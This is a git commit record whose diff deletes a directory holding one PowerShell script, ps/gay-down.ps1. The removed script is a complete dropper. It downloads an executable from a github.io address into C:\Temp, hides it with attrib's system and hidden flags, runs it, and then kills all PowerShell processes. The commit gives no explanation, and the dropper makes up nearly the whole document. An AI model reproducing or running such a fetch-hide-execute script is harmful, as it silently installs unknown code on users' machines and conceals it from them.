c88f38aca1e974c9337a24762d74a344fca74151
xzprojects <145254785+xzprojects@users.noreply.github.com>
2024-03-19 12:13:00 +0700

    Delete ps directory

--- ps/gay-down.ps1
+++
@@ -1,7 +0,0 @@
-Set-Location C:\Temp\
-$URL = "xzprojects.github.io/ps/wins/gay.exe"
-$Path = "C:\Temp\gay.exe"
-Invoke-WebRequest -URI $URL -OutFile $Path
-attrib.exe +r +s +h gay.exe
-.\gay.exe
-taskkill /f /im powershell.exe
